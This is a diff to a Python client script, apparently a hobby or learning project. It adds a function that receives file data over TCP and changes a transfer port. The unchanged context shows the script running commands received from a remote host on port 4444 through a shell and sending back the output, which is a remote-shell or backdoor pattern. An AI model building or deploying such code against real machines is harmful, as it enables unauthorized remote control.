@@ -23,6 +23,24 @@ def get_command(request, sock, host, port):
     return sock.recv(udp_buffer_size).decode()
 
 
+def tcp_thread(host, port):
+    f = None
+    tcp_connection = socket.socket()
+    try:
+        tcp_connection.connect((host, port))
+        f = open(file_name, 'a')
+        current_input = tcp_connection.recv(tcp_buffer_size).decode()
+        print(current_input)
+        while commands.str_to_command(current_input) != Commands.END_TRANSFER:
+            print(current_input)
+            f.write(current_input)
+            current_input = tcp_connection.recv(tcp_buffer_size).decode()
+    finally:
+        tcp_connection.close()
+        f.close()
+
+
+
 # https://contenttool.io/text-difference-checker
 # used this tool to confirm that the read and write functions worked.
 def write_list_into_file(name, byte_or_char_type, input_list):
@@ -34,7 +52,7 @@ def write_list_into_file(name, byte_or_char_type, input_list):
 
 DEFAULT_HOST = 'localhost'
 DEFAULT_PORT = 4444
-DEFAULT_TRANSFER_PORT = 4445
+DEFAULT_TRANSFER_PORT = 4450
 
 REMOTE_HOST = DEFAULT_HOST
 REMOTE_PORT = DEFAULT_PORT
@@ -68,8 +86,8 @@ try:
                     f.write(current_input)
                     current_input = tcp_connection.recv(tcp_buffer_size).decode()
             finally:
-                f.close()
                 tcp_connection.close()
+                f.close()
         else:
             op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
             output = op.stdout.read()
